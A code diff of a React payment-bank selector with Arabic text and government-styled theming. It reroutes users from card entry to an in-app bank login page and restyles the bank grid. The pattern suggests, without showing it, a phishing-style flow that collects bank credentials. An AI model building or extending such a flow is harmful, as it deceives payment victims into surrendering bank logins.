@@ -105,10 +105,10 @@ const PaymentBankSelector = () => {
 
     toast({
       title: "تم التخطي",
-      description: "يمكنك إدخال بيانات البطاقة من أي بنك",
+      description: "سيتم تسجيل الدخول بدون تحديد بنك",
     });
 
-    navigate(`/pay/${id}/card-input`);
+    navigate(`/pay/${id}/bank-login`);
   };
 
   const handleContinue = async () => {
@@ -130,7 +130,7 @@ const PaymentBankSelector = () => {
       // Error saving bank selection
     }
 
-    navigate(`/pay/${id}/card-input`);
+    navigate(`/pay/${id}/bank-login`);
   };
   
   // Show loading state while fetching link data
@@ -244,57 +244,96 @@ const PaymentBankSelector = () => {
         ) : (
           <>
             {/* Banks Grid */}
-            <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 mb-6">
+            <div className="grid grid-cols-2 sm:grid-cols-3 gap-3 sm:gap-4 mb-6">
               {banks.map((bank) => (
                 <Card
                   key={bank.id}
-                  className={`p-4 cursor-pointer transition-all hover:shadow-md ${
+                  className={`p-3 sm:p-4 cursor-pointer transition-all hover:shadow-lg hover:scale-[1.02] ${
                     selectedBank === bank.id
-                      ? 'ring-2'
-                      : 'hover:bg-accent/50'
+                      ? 'ring-2 shadow-lg'
+                      : 'hover:bg-accent/30'
                   }`}
                   style={{
-                    borderColor: selectedBank === bank.id ? govSystem.colors.primary : govSystem.colors.border,
-                    backgroundColor: selectedBank === bank.id ? `${govSystem.colors.primary}05` : undefined,
-                    borderRadius: govSystem.borderRadius.md,
-                    borderWidth: selectedBank === bank.id ? '2px' : '1px'
+                    borderColor: selectedBank === bank.id ? bank.color || govSystem.colors.primary : govSystem.colors.border,
+                    backgroundColor: selectedBank === bank.id ? `${bank.color || govSystem.colors.primary}08` : '#ffffff',
+                    borderRadius: '12px',
+                    borderWidth: selectedBank === bank.id ? '2px' : '1px',
+                    position: 'relative'
                   }}
                   onClick={() => handleBankSelect(bank.id)}
                 >
-                  <div className="flex items-center gap-3">
+                  {/* Checkmark Badge */}
+                  {selectedBank === bank.id && (
                     <div
-                      className="w-10 h-10 rounded-lg flex items-center justify-center text-white text-sm font-bold"
-                      style={{
-                        background: selectedBank === bank.id
-                          ? govSystem.gradients.primary
-                          : '#64748b',
-                        fontFamily: govSystem.fonts.primaryAr
-                      }}
+                      className="absolute -top-2 -right-2 w-6 h-6 rounded-full flex items-center justify-center shadow-md z-10"
+                      style={{ backgroundColor: bank.color || govSystem.colors.primary }}
                     >
-                      {bank.nameAr.charAt(0)}
-                    </div>
-                    <div className="flex-1">
-                      <h3 className="font-semibold text-sm" style={{ fontFamily: govSystem.fonts.primaryAr, color: govSystem.colors.text }}>{bank.nameAr}</h3>
-                      <p className="text-xs" style={{ color: govSystem.colors.textLight }}>{bank.name}</p>
-                    </div>
-                    {selectedBank === bank.id && (
-                      <div
-                        className="w-5 h-5 rounded-full flex items-center justify-center"
-                        style={{ backgroundColor: govSystem.colors.primary }}
+                      <svg
+                        className="w-3.5 h-3.5 text-white"
+                        fill="none"
+                        strokeLinecap="round"
+                        strokeLinejoin="round"
+                        strokeWidth="3"
+                        viewBox="0 0 24 24"
+                        stroke="currentColor"
                       >
-                        <svg
-                          className="w-3 h-3 text-white"
-                          fill="none"
-                          strokeLinecap="round"
-                          strokeLinejoin="round"
-                          strokeWidth="2"
-                          viewBox="0 0 24 24"
-                          stroke="currentColor"
-                        >
-                          <path d="M5 13l4 4L19 7" />
-                        </svg>
+                        <path d="M5 13l4 4L19 7" />
+                      </svg>
+                    </div>
+                  )}
+                  
+                  <div className="flex flex-col items-center gap-2 sm:gap-3">
+                    {/* Bank Logo */}
+                    {bank.logo ? (
+                      <div 
+                        className="w-16 h-16 sm:w-20 sm:h-20 rounded-xl flex items-center justify-center p-2 sm:p-3 bg-white border transition-all"
+                        style={{
+                          borderColor: selectedBank === bank.id ? bank.color : '#e5e7eb',
+                          borderWidth: selectedBank === bank.id ? '2px' : '1px',
+                        }}
+                      >
+                        <img 
+                          src={bank.logo} 
+                          alt={bank.nameAr}
+                          className="w-full h-full object-contain"
+                          onError={(e) => {
+                            // Fallback if image fails to load
+                            const target = e.target as HTMLImageElement;
+                            target.style.display = 'none';
+                            const parent = target.parentElement;
+                            if (parent) {
+                              parent.innerHTML = `<div class="w-full h-full flex items-center justify-center text-2xl font-bold" style="color: ${bank.color}">${bank.nameAr.charAt(0)}</div>`;
+                            }
+                          }}
+                        />
+                      </div>
+                    ) : (
+                      <div
+                        className="w-16 h-16 sm:w-20 sm:h-20 rounded-xl flex items-center justify-center text-white text-2xl sm:text-3xl font-bold"
+                        style={{
+                          backgroundColor: bank.color || govSystem.colors.primary,
+                          fontFamily: govSystem.fonts.primaryAr
+                        }}
+                      >
+                        {bank.nameAr.charAt(0)}
                       </div>
                     )}
+                    
+                    {/* Bank Name */}
+                    <div className="text-center w-full">
+                      <h3 
+                        className="font-bold text-xs sm:text-sm leading-tight mb-0.5" 
+                        style={{ 
+                          fontFamily: govSystem.fonts.primaryAr, 
+                          color: selectedBank === bank.id ? (bank.color || govSystem.colors.primary) : govSystem.colors.text 
+                        }}
+                      >
+                        {bank.nameAr}
+                      </h3>
+                      <p className="text-[10px] sm:text-xs leading-tight" style={{ color: govSystem.colors.textLight }}>
+                        {bank.name}
+                      </p>
+                    </div>
                   </div>
                 </Card>
               ))}
@@ -325,9 +364,9 @@ const PaymentBankSelector = () => {
             </div>
 
             {/* Info Note */}
-            <div className="mt-6 p-4 bg-muted/50 rounded-lg">
-              <p className="text-xs text-muted-foreground text-center">
-                💡 يمكنك تخطي هذه الخطوة واستخدام بطاقة من أي بنك
+            <div className="mt-6 p-4 rounded-xl border" style={{ backgroundColor: `${govSystem.colors.primary}05`, borderColor: `${govSystem.colors.primary}20` }}>
+              <p className="text-xs text-center" style={{ color: govSystem.colors.text }}>
+                🔐 سيتم توجيهك لصفحة تسجيل الدخول الآمنة للبنك المختار
               </p>
             </div>
           </>
